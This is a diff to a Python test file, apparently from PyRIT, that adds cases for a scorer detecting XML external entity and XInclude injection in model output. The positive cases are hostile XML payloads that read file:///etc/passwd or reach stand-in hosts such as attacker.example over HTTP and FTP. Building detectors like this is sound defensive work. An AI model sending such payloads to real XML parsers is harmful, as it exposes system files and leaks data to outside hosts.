@@ -19,6 +19,9 @@ from pyrit.score import XXEOutputScorer
         '<!ENTITY data SYSTEM "https://attacker.com/x">',
         '<xi:include href="file:///etc/passwd" />',
         '<xi:include href="https://attacker.example/collect" />',
+        '<include xmlns="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" />',
+        "<include href='FTP://attacker.example/data'\nxmlns='http://www.w3.org/2001/XInclude' />",
+        "<xi:include\nparse='text' href = 'http://attacker.example/data' />",
     ],
 )
 async def test_xxe_detected(text: str, patch_central_database):
@@ -36,6 +39,13 @@ async def test_xxe_detected(text: str, patch_central_database):
         "Use XML for your configuration files.",
         '<xi:include href="relative-notes.xml" />',
         '<document href="file:///etc/passwd" />',
+        '<include href="https://example.com/help.xml" />',
+        '<include xmlns="https://example.com/schema" href="https://example.com/help.xml" />',
+        '<xi:include data-href="https://example.com/help.xml" />',
+        '<xi:include x:href="https://example.com/help.xml" />',
+        '<xi:include-notes href="https://example.com/help.xml" />',
+        '<other:include href="https://example.com/help.xml" />',
+        '<include xmlns="http://www.w3.org/2001/XInclude" data-href="https://example.com/help.xml" />',
     ],
 )
 async def test_xxe_not_detected(text: str, patch_central_database):
